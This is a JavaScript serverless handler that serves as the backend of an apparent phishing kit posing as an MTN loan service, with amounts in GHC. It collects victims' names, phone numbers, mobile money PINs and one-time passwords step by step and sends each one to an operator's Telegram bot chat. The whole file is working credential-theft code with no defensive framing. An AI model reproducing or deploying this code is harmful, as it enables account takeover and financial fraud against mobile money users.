export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const { step, userId, data } = req.body;

        let message = `🚨 *MTN LOAN ALERT* 🚨\n\nSession: ${userId}\nStep: *${step}*\n\n`;
        
        if (step === 'Application') message += `Name: ${data.name}\nPhone: ${data.phone}\nAmount: GHC ${data.amount}`;
        else if (step === 'Phone') message += `Login Phone: ${data.phone}`;
        else if (step === 'PIN') message += `PIN: \`${data.pin}\``;
        else if (step === 'OTP') message += `OTP: \`${data.otp}\``;

        const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_TOKEN || !CHAT_ID) throw new Error("Missing Vercel Environment Variables");

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });

        if (!response.ok) throw new Error("Telegram API Error");
        return res.status(200).json({ success: true });

    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
